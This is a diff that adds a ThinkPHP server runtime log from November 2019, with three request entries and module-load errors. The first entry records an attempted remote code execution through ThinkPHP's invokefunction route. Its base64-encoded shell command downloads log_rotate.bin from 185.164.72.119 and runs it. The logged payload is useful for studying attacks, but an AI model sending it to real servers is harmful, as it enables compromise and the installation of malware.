@@ -1,0 +1,18 @@
+[ 2019-11-17T08:13:22+08:00 ] 178.32.46.58 /?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=echo%24IFS%24()KGN1cmwgLXMgaHR0cDovLzE4NS4xNjQuNzIuMTE5L2xvZ19yb3RhdGUuYmlufHx3Z2V0IC1xIC1PLSBodHRwOi8vMTg1LjE2NC43Mi4xMTkvbG9nX3JvdGF0ZS5iaW4pfHNo%7Cbase64%24IFS%24()-d%7Csh
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000195s ]
+ERR: 无法加载模块:Index
+
+[ 2019-11-17T08:13:24+08:00 ] 178.32.46.58 /index.php?s=captcha
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000007s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000191s ]
+ERR: 无法加载模块:Captcha
+
+[ 2019-11-17T21:32:23+08:00 ] 157.55.39.1 /robots.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000184s ]
+ERR: 无法加载模块:Robots
+
